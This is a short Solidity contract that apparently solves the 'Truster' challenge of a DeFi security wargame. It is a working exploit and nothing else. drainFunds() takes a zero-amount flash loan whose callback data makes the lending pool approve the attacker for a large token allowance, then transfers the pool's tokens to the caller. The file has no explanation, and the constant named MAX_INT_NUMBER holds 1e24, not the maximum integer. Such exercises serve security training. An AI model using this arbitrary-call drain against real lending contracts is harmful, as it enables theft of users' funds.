import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract TrusterAttackContract {
    IERC20 public immutable token;
    TrusterLenderPool public immutable pool;
    uint256 constant public MAX_INT_NUMBER = 1000000000000000000000000;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    function drainFunds() public {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), MAX_INT_NUMBER);
        pool.flashLoan(0, msg.sender, address(token), data);

        token.transferFrom(address(pool), msg.sender, MAX_INT_NUMBER);
    }
}